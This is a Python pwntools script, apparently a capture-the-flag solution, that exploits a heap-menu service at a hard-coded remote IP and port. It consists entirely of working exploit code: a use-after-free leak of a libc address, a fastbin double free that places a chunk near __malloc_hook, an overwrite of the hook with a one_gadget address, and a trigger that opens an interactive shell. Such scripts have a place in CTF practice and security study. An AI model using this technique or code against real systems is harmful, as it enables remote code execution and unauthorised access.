from pwn import*
def add(size,content):
	p.recvuntil('choice>>')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
def show(index):
	p.recvuntil('choice>>')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))
def edit(index,content):
	p.recvuntil('choice>>')
	p.sendline('3')
	p.recvuntil('Index:')
	p.sendline(str(index))
	p.sendline(content)
def free(index):
	p.recvuntil('choice>>')
	p.sendline('4')
	p.recvuntil('Index:')
	p.sendline(str(index))

p = remote('45.76.173.177',6666)
#context.log_level = 'debug'
add(0x88,'')
add(0x60,'')
add(0x60,'')
free(0)
show(0)
main_arena = u64(p.recv(6).ljust(8,'\x00')) - 88
libc_base = main_arena - 0x397B00
add(0x88,'')
free(1)
free(2)
free(1)
malloc_hook = main_arena - 0x10
one_gadget = libc_base + 0xD694F
add(0x60,p64(malloc_hook - 0x23))
add(0x60,'')
add(0x60,'')
add(0x60,'\x00'*19 + p64(one_gadget))
p.sendlineafter('choice>>','1')
p.sendlineafter('Size:','16')
p.interactive()
